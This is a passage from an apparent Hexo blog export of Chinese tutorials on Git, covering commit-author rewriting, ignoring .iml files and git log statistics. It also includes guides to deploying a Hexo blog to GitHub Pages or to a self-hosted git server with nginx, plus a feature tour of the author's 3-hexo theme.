<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> !/bin/sh</span></span><br><span class="line"></span><br><span class="line">git filter-branch --env-filter &#x27;</span><br><span class="line">an=&quot;$GIT_AUTHOR_NAME&quot;</span><br><span class="line">am=&quot;$GIT_AUTHOR_EMAIL&quot;</span><br><span class="line">cn=&quot;$GIT_COMMITTER_NAME&quot;</span><br><span class="line">cm=&quot;$GIT_COMMITTER_EMAIL&quot;</span><br><span class="line"></span><br><span class="line">if [ &quot;$GIT_COMMITTER_EMAIL&quot; = &quot;old@mail.com&quot; ]</span><br><span class="line">then</span><br><span class="line">    cn=&quot;New-Author&quot;</span><br><span class="line">    cm=&quot;new@mail.com&quot;</span><br><span class="line">fi</span><br><span class="line">if [ &quot;$GIT_AUTHOR_EMAIL&quot; = &quot;old@mail.com&quot; ]</span><br><span class="line">then</span><br><span class="line">    an=&quot;New-Author&quot;</span><br><span class="line">    am=&quot;new@mail.com&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">export GIT_AUTHOR_NAME=&quot;$an&quot;</span><br><span class="line">export GIT_AUTHOR_EMAIL=&quot;$am&quot;</span><br><span class="line">export GIT_COMMITTER_NAME=&quot;$cn&quot;</span><br><span class="line">export GIT_COMMITTER_EMAIL=&quot;$cm&quot;</span><br><span class="line">&#x27;</span><br></pre></td></tr></table></figure>
<p>2.运行脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sh change.sh</span><br></pre></td></tr></table></figure>

<h3 id="忽略已提交的文件（-iml）"><a href="#忽略已提交的文件（-iml）" class="headerlink" title="忽略已提交的文件（.iml）"></a>忽略已提交的文件（.iml）</h3><ol>
<li>删除已提交的文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除项目中所有的.iml后缀的文件</span></span><br><span class="line">$ find . -name <span class="string">&quot;*.iml&quot;</span> | xargs rm -f</span><br></pre></td></tr></table></figure></li>
<li>添加<code>.gitignore</code>文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*.iml</span><br><span class="line">/**/*.iml</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<p>持续更新中～～～</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git统计操作</title>
    <url>//Git%E7%BB%9F%E8%AE%A1%E6%93%8D%E4%BD%9C</url>
    <content><![CDATA[<h2 id="按commit统计"><a href="#按commit统计" class="headerlink" title="按commit统计"></a>按commit统计</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 统计当前作者今天（从凌晨1点开始）提交次数</span></span><br><span class="line">$ git <span class="built_in">log</span> --author=<span class="string">&quot;<span class="subst">$(git config --get user.name)</span>&quot;</span> --no-merges --since=1am --<span class="built_in">stat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按提交作者统计，按提交次数排序</span></span><br><span class="line">$ git shortlog -sn</span><br><span class="line">$ git shortlog --numbered --summary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只看某作者提交的commit数</span></span><br><span class="line">$ git <span class="built_in">log</span> --author=<span class="string">&quot;faker&quot;</span> --oneline --shortstat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按提交作者统计，提交数量排名前5（看全部，去掉head管道即可）</span></span><br><span class="line">$ git <span class="built_in">log</span> --pretty=<span class="string">&#x27;%aN&#x27;</span> | sort | uniq -c | sort -k1 -n -r | head -n 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按提交者邮箱统计，提交数量排名前5</span></span><br><span class="line">$ git <span class="built_in">log</span> --pretty=format:%ae | gawk -- <span class="string">&#x27;&#123; ++c[$0]; &#125; END &#123; for(cc in c) printf &quot;%5d %s\n&quot;,c[cc],cc; &#125;&#x27;</span> | sort -u -n -r | head -n 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计贡献者数量</span></span><br><span class="line">$ git <span class="built_in">log</span> --pretty=<span class="string">&#x27;%aN&#x27;</span> | sort -u | wc -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计提交数量</span></span><br><span class="line">$ git <span class="built_in">log</span> --oneline | wc -l</span><br></pre></td></tr></table></figure>
<h2 id="按代码行数统计"><a href="#按代码行数统计" class="headerlink" title="按代码行数统计"></a>按代码行数统计</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 统计指定作者增删行数</span></span><br><span class="line">$ git <span class="built_in">log</span> --author=<span class="string">&quot;faker&quot;</span> --pretty=tformat: --numstat | awk <span class="string">&#x27;&#123; add += $1; subs += $2; loc += $1 - $2 &#125; END &#123; printf &quot;added lines: %s, removed lines: %s, total lines: %s\n&quot;, add, subs, loc &#125;&#x27;</span> -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计当前作者增删行数</span></span><br><span class="line">$ git <span class="built_in">log</span> --author=<span class="string">&quot;<span class="subst">$(git config --get user.name)</span>&quot;</span> --pretty=tformat: --numstat | gawk <span class="string">&#x27;&#123; add += $1 ; subs += $2 ; loc += $1 - $2 &#125; END &#123; printf &quot;added lines: %s removed lines : %s total lines: %s\n&quot;,add,subs,loc &#125;&#x27;</span> -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计所有邮箱前缀的增删行数 -英文版</span></span><br><span class="line">$ git <span class="built_in">log</span> --shortstat --pretty=<span class="string">&quot;%cE&quot;</span> | sed <span class="string">&#x27;s/\(.*\)@.*/\1/&#x27;</span> | grep -v <span class="string">&quot;^$&quot;</span> | awk <span class="string">&#x27;BEGIN &#123; line=&quot;&quot;; &#125; !/^ / &#123; if (line==&quot;&quot; || !match(line, $0)) &#123;line = $0 &quot;,&quot; line &#125;&#125; /^ / &#123; print line &quot; # &quot; $0; line=&quot;&quot;&#125;&#x27;</span> | sort | sed -E <span class="string">&#x27;s/# //;s/ files? changed,//;s/([0-9]+) ([0-9]+ deletion)/\1 0 insertions\(+\), \2/;s/\(\+\)$/\(\+\), 0 deletions\(-\)/;s/insertions?\(\+\), //;s/ deletions?\(-\)//&#x27;</span> | awk <span class="string">&#x27;BEGIN &#123;name=&quot;&quot;; files=0; insertions=0; deletions=0;&#125; &#123;if ($1 != name &amp;&amp; name != &quot;&quot;) &#123; print name &quot;: &quot; files &quot; files changed, &quot; insertions &quot; insertions(+), &quot; deletions &quot; deletions(-), &quot; insertions-deletions &quot; net&quot;; files=0; insertions=0; deletions=0; name=$1; &#125; name=$1; files+=$2; insertions+=$3; deletions+=$4&#125; END &#123;print name &quot;: &quot; files &quot; files changed, &quot; insertions &quot; insertions(+), &quot; deletions &quot; deletions(-), &quot; insertions-deletions &quot; net&quot;;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计所有邮箱前缀的增删行数 -中文版</span></span><br><span class="line">$ git <span class="built_in">log</span> --shortstat --pretty=<span class="string">&quot;%cE&quot;</span> | sed <span class="string">&#x27;s/\(.*\)@.*/\1/&#x27;</span> | grep -v <span class="string">&quot;^$&quot;</span> | awk <span class="string">&#x27;BEGIN &#123; line=&quot;&quot;; &#125; !/^ / &#123; if (line==&quot;&quot; || !match(line, $0)) &#123;line = $0 &quot;,&quot; line &#125;&#125; /^ / &#123; print line &quot; # &quot; $0; line=&quot;&quot;&#125;&#x27;</span> | sort | sed -E <span class="string">&#x27;s/# //;s/ files? changed,//;s/([0-9]+) ([0-9]+ deletion)/\1 0 insertions\(+\), \2/;s/\(\+\)$/\(\+\), 0 deletions\(-\)/;s/insertions?\(\+\), //;s/ deletions?\(-\)//&#x27;</span> | awk <span class="string">&#x27;BEGIN &#123;name=&quot;&quot;; files=0; insertions=0; deletions=0;&#125; &#123;if ($1 != name &amp;&amp; name != &quot;&quot;) &#123; print name &quot;: &quot; files &quot; 个文件被改变, &quot; insertions &quot; 行被插入(+), &quot; deletions &quot; 行被删除(-), &quot; insertions-deletions &quot; 行剩余&quot;; files=0; insertions=0; deletions=0; name=$1; &#125; name=$1; files+=$2; insertions+=$3; deletions+=$4&#125; END &#123;print name &quot;: &quot; files &quot; 个文件被改变, &quot; insertions &quot; 行被插入(+), &quot; deletions &quot; 行被删除(-), &quot; insertions-deletions &quot; 行剩余&quot;;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计所有作者增删行数 --英文版</span></span><br><span class="line">$ git <span class="built_in">log</span> --format=<span class="string">&#x27;%aN&#x27;</span> | sort -u | <span class="keyword">while</span> <span class="built_in">read</span> name; <span class="keyword">do</span> <span class="built_in">echo</span> -en <span class="string">&quot;<span class="variable">$name</span>\t&quot;</span>; git <span class="built_in">log</span> --author=<span class="string">&quot;<span class="variable">$name</span>&quot;</span> --pretty=tformat: --numstat | awk <span class="string">&#x27;&#123; add += $1; subs += $2; loc += $1 - $2 &#125; END &#123; printf &quot;added lines: %s, removed lines: %s, total lines: %s\n&quot;, add, subs, loc &#125;&#x27;</span> -; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计所有作者增删行数 --中文版</span></span><br><span class="line">$ git <span class="built_in">log</span> --format=<span class="string">&#x27;%aN&#x27;</span> | sort -u | <span class="keyword">while</span> <span class="built_in">read</span> name; <span class="keyword">do</span> <span class="built_in">echo</span> -en <span class="string">&quot;<span class="variable">$name</span>\t&quot;</span>; git <span class="built_in">log</span> --author=<span class="string">&quot;<span class="variable">$name</span>&quot;</span> --pretty=tformat: --numstat | awk <span class="string">&#x27;&#123; add += $1; subs += $2; loc += $1 - $2 &#125; END &#123; printf &quot;添加行数: %s, 删除行数: %s, 总行数: %s\n&quot;, add, subs, loc &#125;&#x27;</span> -; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2 id="git-log-说明"><a href="#git-log-说明" class="headerlink" title="git log 说明"></a>git log 说明</h2><blockquote>
<p>git log 参数说明：<br><code>--</code>author   指定作者<br><code>--</code>stat   显示每次更新的文件修改统计信息，会列出具体文件列表<br><code>--</code>shortstat    统计每个commit 的文件修改行数，包括增加，删除，但不列出文件列表：<br><code>--</code>numstat   统计每个commit 的文件修改行数，包括增加，删除，并列出文件列表：</p>
</blockquote>
<blockquote>
<p>-p 选项展开显示每次提交的内容差异，用 -2 则仅显示最近的两次更新<br>       例如：git log -p  -2<br><code>--</code>name-only 仅在提交信息后显示已修改的文件清单<br><code>--</code>name-status 显示新增、修改、删除的文件清单<br><code>--</code>abbrev-commit 仅显示 SHA-1 的前几个字符，而非所有的 40 个字符<br><code>--</code>relative-date 使用较短的相对时间显示（比如，“2 weeks ago”）<br><code>--</code>graph 显示 ASCII 图形表示的分支合并历史<br><code>--</code>pretty 使用其他格式显示历史提交信息。可用的选项包括 oneline，short，full，fuller 和 format（后跟指定格式）<br>       <strong>例如：</strong><br>       <code>git log --pretty=oneline</code> ;<br>       <code>git log --pretty=short</code> ;<br>        <code>git log --pretty=full</code> ;<br>        git log –pretty=fuller<br><code>--</code>pretty=tformat:   可以定制要显示的记录格式，这样的输出便于后期编程提取分析<br>       <strong>例如：</strong><br>       <code>git log --pretty=format:&quot;&quot;%h - %an, %ar : %s&quot;&quot;</code><br>       下面列出了常用的格式占位符写法及其代表的意义。<br>       选项       说明<br>       %H      提交对象（commit）的完整哈希字串<br>       %h      提交对象的简短哈希字串<br>       %T      树对象（tree）的完整哈希字串<br>       %t      树对象的简短哈希字串<br>       %P      父对象（parent）的完整哈希字串<br>       %p      父对象的简短哈希字串<br>       %an     作者（author）的名字<br>       %ae     作者的电子邮件地址<br>       %ad     作者修订日期（可以用 -date= 选项定制格式）<br>       %ar     作者修订日期，按多久以前的方式显示<br>       %cn     提交者(committer)的名字<br>       %ce     提交者的电子邮件地址<br>       %cd     提交日期<br>       %cr     提交日期，按多久以前的方式显示<br>       %s      提交说明<br><code>--</code>since  限制显示输出的范围，<br>       例如： <code>git log --since=2.weeks</code>    显示最近两周的提交<br>       选项 说明<br>       -(n)    仅显示最近的 n 条提交<br>       <code>--</code>since, <code>--</code>after 仅显示指定时间之后的提交。<br>       <code>--</code>until, <code>--</code>before 仅显示指定时间之前的提交。<br>       <code>--</code>author 仅显示指定作者相关的提交。<br>       <code>--</code>committer 仅显示指定提交者相关的提交。</p>
</blockquote>
<blockquote>
<p>   <strong>一些例子：</strong><br><code>git log --until=1.minute.ago</code> // 一分钟之前的所有 log<br><code>git log --since=1.day.ago</code> //一天之内的log<br><code>git log --since=1.hour.ago</code> //一个小时之内的 log<br><code>git log --since=1.month.ago --until=2.weeks.ago</code> //一个月之前到半个月之前的log<br><code>git log --since ==2013-08.01 --until=2013-09-07</code> //某个时间段的 log<br><code>git blame</code> 看看某一个文件的相关历史记录<br>例如：<code>git blame index.html --date short</code></p>
</blockquote>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+GitHub Pages搭建属于自己的blog</title>
    <url>//hexo-gitHub-pages-create-own-blog</url>
    <content><![CDATA[<p>Hexo是一个快速，简单，功能强大的开源博客框架-》<a href="https://hexo.io/">官网</a><br>GitHub Pages 是一个不受限的网站空间。<br>两者相得益彰。给那些喜欢自己折腾的人提供一些借鉴。</p>
<span id="more"></span>
<h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>博主使用系统：Deepin Linux 15.3桌面版<br>安装 node与npm</p>
<h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
<h3 id="初始化blog"><a href="#初始化blog" class="headerlink" title="初始化blog"></a>初始化blog</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure>
<p>至此，本地blog已经创建完成，是不是很简单，简单到没朋友</p>
<h3 id="选择主题"><a href="#选择主题" class="headerlink" title="选择主题"></a>选择主题</h3><p>可以在<a href="https://hexo.io/themes/">hexo官网</a>查看自己喜欢的主题<br>通过git clone [url] themes/xxx 将主题克隆到本地，<br>修改 <code>_config.yml</code> 中的theme：xxx</p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建一个新的文章</span></span><br><span class="line">$ hexo new <span class="string">&quot;文章名&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成静态文件</span></span><br><span class="line">$ hexo generate</span><br><span class="line"></span><br><span class="line"><span class="comment">#将一个草稿发布出去</span></span><br><span class="line">$ hexo publish [layout] &lt;filename&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动一个本地服务器</span></span><br><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>更多命令移步<a href="https://hexo.io/docs/commands.html">官方文档</a></p>
<h3 id="搭建github-pages"><a href="#搭建github-pages" class="headerlink" title="搭建github pages"></a>搭建github pages</h3><p>本地blog已经搭建完成，现在可以发布到github pages上</p>
<h4 id="注册github账户"><a href="#注册github账户" class="headerlink" title="注册github账户"></a>注册github账户</h4><p>到<a href="https://github.com/">github官网</a>注册一个github账户</p>
<h4 id="配置登录免密码"><a href="#配置登录免密码" class="headerlink" title="配置登录免密码"></a>配置登录免密码</h4><p>移步 <a href="#">Post not found: Git-SSH-HTTPS-verify-configuration</a></p>
<h4 id="创建github远程仓库"><a href="#创建github远程仓库" class="headerlink" title="创建github远程仓库"></a>创建github远程仓库</h4><p>在github上创建一个仓库 <code>xxx.github.io</code> xxx为自己的github用户名</p>
<h4 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<h4 id="配置Hexo"><a href="#配置Hexo" class="headerlink" title="配置Hexo"></a>配置Hexo</h4><p>修改 <code>_comfig.yml</code>,xxx为你的用户名</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">   type: git</span><br><span class="line">   repo: git@github.com:xxx/xxx.github.io.git</span><br><span class="line">   branch: master</span><br></pre></td></tr></table></figure>
<h4 id="推送服务器"><a href="#推送服务器" class="headerlink" title="推送服务器"></a>推送服务器</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<blockquote>
<p>若出现<code>ERROR Deployer not found: git</code>报错，请执行上面安装插件步骤</p>
</blockquote>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>打开 <code>xxx.github.io</code> ，就能看到你的blog了</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>Git</tag>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+Git服务器搭建blog</title>
    <url>//hexo-git-server-blog</url>
    <content><![CDATA[<p>博主最近在服务器上搭建Hexo发布平台，感觉整个搭建过程和搭建思想蛮有意思，在此记录一下，供猿友参考<br>Hexo 是一个快速，简单，功能强大，主题社区特别庞大的开源blog框架-》<a href="https://hexo.io/">官网</a><br>本次搭建是通过在服务器上搭建Git服务器来实现一键发布blog</p>
<span id="more"></span>
<h2 id="搭建思路"><a href="#搭建思路" class="headerlink" title="搭建思路"></a>搭建思路</h2><p><img src="http://img.saodiyang.com/FjUDxVksbmykVH1wvQJc4h57wMrQ.jpg" class="lazyload" data-srcset="http://img.saodiyang.com/FjUDxVksbmykVH1wvQJc4h57wMrQ.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="图解"></p>
<ol>
<li>客户端就是自己的电脑,可以把hexo的静态资源目录当成一个git仓库.</li>
<li>首先配置好远程git仓库,通过 hexo d 将静态网站资源push到远程git仓库</li>
<li>git仓库接收到push处理完成后,自动触发post-receive这个钩子.</li>
<li>执行钩子内容,进入到 /var/www/blog 目录(也是一个git仓库),拉取刚才hexo推送到git服务端的静态网站资源.</li>
<li>配置nginx,将80端口映射到 /var/www/blog 目录.</li>
<li>就可以直接通过ip访问到静态blog了</li>
</ol>
<h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="在服务器上安装git并创建git远程仓库-如-blog-git"><a href="#在服务器上安装git并创建git远程仓库-如-blog-git" class="headerlink" title="在服务器上安装git并创建git远程仓库 如 blog.git"></a>在服务器上安装git并创建git远程仓库 如 <code>blog.git</code></h4><p>搭建过程移步 <a href="#">Post not found: set-up-git-server-on-vps</a></p>
<h4 id="在-config-yml-中配置git服务器"><a href="#在-config-yml-中配置git服务器" class="headerlink" title="在 _config.yml 中配置git服务器"></a>在 <code>_config.yml</code> 中配置git服务器</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">    type: git</span><br><span class="line">    repo: git@server:/home/git/blog.git</span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure>
<p>如果ssh端口不是默认的22的话，如下配置,8080改为自己服务器上ssh端口</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">    type: git</span><br><span class="line">    repo: ssh://git@server:8080/home/git/blog.git</span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure>
<h4 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h4><p>现在已经可以使用 <code>hexo d</code> 将hexo中的生成的静态资源发送到远程服务器中，接下来我们要配置nginx来配置静态web。<br>安装过程可以自行Google，在此只说明nginx如何配置静态web<br>首先创建一个目录作为存放web资源（hexo生成的）的目录，如： <code>/var/www/blog</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www</span><br><span class="line"><span class="comment">#创建blog目录，并克隆blog.git仓库的内容</span></span><br><span class="line">git <span class="built_in">clone</span> /home/git/blog.git blog</span><br></pre></td></tr></table></figure>
<p>找到 <code>nginx.conf</code> 添加以下信息</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    root   /var/www/blog;</span><br><span class="line">    index  index.htm index.html index.jsp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#重启并加载配置文件</span></span><br><span class="line">$ nginx -s reload</span><br></pre></td></tr></table></figure>
<h4 id="配置git服务器hooks"><a href="#配置git服务器hooks" class="headerlink" title="配置git服务器hooks"></a>配置git服务器hooks</h4><p>这个钩子的作用是，当git服务器接受客户端push完成更新，执行此文件内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建并编辑post-receive</span></span><br><span class="line">$ vim blog.git/hooks/post-receive</span><br></pre></td></tr></table></figure>
<p>内容如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">unset</span> GIT_DIR <span class="comment">#还原环境变量，否则会拉不到代码</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/blog</span><br><span class="line">git pull origin master <span class="comment">#拉取最新代码</span></span><br></pre></td></tr></table></figure>
<h4 id="测试效果"><a href="#测试效果" class="headerlink" title="测试效果"></a>测试效果</h4><p>在本地的hexo下执行 <code>hexo d</code><br>查看 /var/www/blog文件夹内的内容也发生变化</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo主题3-hexo</title>
    <url>//3-hexo</url>
    <content><![CDATA[<p>阮一峰曾言：喜欢写blog的人，会经历三个阶段</p>
<blockquote>
<p>第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。<br>第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。<br>第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。</p>
</blockquote>
<p>有对搭建个人blog有兴趣的朋友，可以翻看我往期文章。</p>
<p>笔者从去年开始通过hexo写blog，使用了yilia主题，但是随着文章数量的上升，检索等操作就显得特别笨重。</p>
<p>在遍寻无果的情况下，就写下了<a href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo</a>主题。Demo:<a href="http://yelog.org/">http://yelog.org</a></p>
<p>多图预警 ↓↓↓</p>
<h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><h3 id="整体设计"><a href="#整体设计" class="headerlink" title="整体设计"></a>整体设计</h3><p><strong>三段式设计:</strong><br><img src="http://img.saodiyang.com/Fl2tl1Is5zx-D0DAt03bg0WkWXhO.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fl2tl1Is5zx-D0DAt03bg0WkWXhO.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="三段式设计"></p>
<h3 id="通过分类过滤"><a href="#通过分类过滤" class="headerlink" title="通过分类过滤"></a>通过分类过滤</h3><p><img src="http://img.saodiyang.com/FmooXnOPeRPGBts5V5W7CV0AHuIo.gif" class="lazyload" data-srcset="http://img.saodiyang.com/FmooXnOPeRPGBts5V5W7CV0AHuIo.gif" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="分类过滤文章"></p>
<h3 id="通过标题关键字搜索"><a href="#通过标题关键字搜索" class="headerlink" title="通过标题关键字搜索"></a>通过标题关键字搜索</h3><p><img src="http://img.saodiyang.com/FkF9lgTJoLdmNlYbTVokSNB3zdS4.gif" class="lazyload" data-srcset="http://img.saodiyang.com/FkF9lgTJoLdmNlYbTVokSNB3zdS4.gif" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="文章标题关键字搜索"></p>
<h3 id="通过作者搜索"><a href="#通过作者搜索" class="headerlink" title="通过作者搜索"></a>通过作者搜索</h3><p><strong>若开启了多作者模式，则可以通过输入@，进行作者搜索，如下所示</strong><br><img src="http://img.saodiyang.com/FhbFRRPIDuz1pEKH-dr-RWDHVvXn.gif" class="lazyload" data-srcset="http://img.saodiyang.com/FhbFRRPIDuz1pEKH-dr-RWDHVvXn.gif" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="通过作者搜索"></p>
<h3 id="通过标签搜索"><a href="#通过标签搜索" class="headerlink" title="通过标签搜索"></a>通过标签搜索</h3><p><strong>输入#，就会出现标签提示</strong><br><img src="http://img.saodiyang.com/FoJsDnsoLWKo7ECSzcLmzUX_uWgw.gif" class="lazyload" data-srcset="http://img.saodiyang.com/FoJsDnsoLWKo7ECSzcLmzUX_uWgw.gif" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="通过标签搜索"></p>
<h3 id="评论功能"><a href="#评论功能" class="headerlink" title="评论功能"></a>评论功能</h3><p><img src="http://img.saodiyang.com/FtDD77YX_xenS-AZQW56qrwrQc4D.gif" class="lazyload" data-srcset="http://img.saodiyang.com/FtDD77YX_xenS-AZQW56qrwrQc4D.gif" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="测试一下评论"></p>
<h3 id="打赏功能"><a href="#打赏功能" class="headerlink" title="打赏功能"></a>打赏功能</h3><p><img src="http://img.saodiyang.com/FhlNgOF7ipEIVrrztFdRam3WRikw.gif" class="lazyload" data-srcset="http://img.saodiyang.com/FhlNgOF7ipEIVrrztFdRam3WRikw.gif" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="打赏功能"></p>
<h3 id="文章置顶"><a href="#文章置顶" class="headerlink" title="文章置顶"></a>文章置顶</h3><p><img src="http://img.saodiyang.com/FhQLLqrRCr4yFGl9nDb_9oc4yME-.png" class="lazyload" data-srcset="http://img.saodiyang.com/FhQLLqrRCr4yFGl9nDb_9oc4yME-.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="文章置顶"></p>
